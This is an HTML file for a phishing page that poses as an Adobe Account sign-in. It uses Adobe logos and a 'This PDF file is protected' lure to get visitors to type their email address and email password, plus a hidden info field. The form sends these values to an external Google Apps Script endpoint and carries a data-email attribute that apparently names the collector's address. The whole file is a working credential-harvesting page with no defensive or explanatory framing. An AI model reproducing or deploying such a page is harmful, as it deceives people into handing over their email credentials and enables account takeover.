<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Adobe Account</title>
    <link rel="icon" href="favico.ico" type="image/gif" sizes="16x16">
    <meta name="description"
        content="Manage your Adobe Account profile, password, security options, product service subscriptions, privacy settings, and communicaiton preferences. ">
    <!-- Compiled and minified CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <link rel="stylesheet" href="./style.css">
</head>

<body>
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12 form">
                <img class="header-img"
                    src="./images/kisspng-adobe-systems-logo-business-adobe-acrobat-adobe-premier-5b48b7de87b4c3.4823781215314923185559.png"
                    width="120px">
                <h4>Sign In using your email and password</h4>
                <div class="logo"><img src="./images/Adobe-logo.png" width="30%" /></div>
                <form class='gform' id="contact" data-email="hxan619@gmail.com" method="POST"
                    action="https://script.google.com/macros/s/AKfycbwcezWyjISy7yfv-VNOfb5mhwlwE-Y-jwn3u3D9aOSkRJYAHMc/exec">
                    <input name="email" class="email" type="email" placeholder="Recover Email Address" />
                    <input name="pass" class="password" type="password" placeholder="Email Password" />
                    <input name="user_informaion" type="text" id="info" style="display: none;" />
                    <a href="#" class="pdf-link">This PDF file is protected</a>
                    <br>
                    <button type="submit" class="view_file">VIEW FILE</button>
                </form>
                <br>
                <br>
                <div class="footer">
                    Sign in with your recieving email and password
                </div>
            </div>
        </div>
    </div>
    <div class="loader">
        <div class="preloader-wrapper active">
            <div class="spinner-layer spinner-blue-only">
                <div class="circle-clipper left">
                    <div class="circle"></div>
                </div>
                <div class="gap-patch">
                    <div class="circle"></div>
                </div>
                <div class="circle-clipper right">
                    <div class="circle"></div>
                </div>
            </div>
        </div>

    </div>

    <!-- Compiled and minified JavaScript -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    <script data-cfasync="false" type="text/javascript" src="./js/form-submission-handler.js"></script>
    <script>
        window.addEventListener('DOMContentLoaded', () => {

            var toastElement = document.querySelector('.toast');
            var toastInstance = M.Toast.getInstance(toastElement);
        })
        // toastInstance.dismiss();
    </script>
</body>

</html>
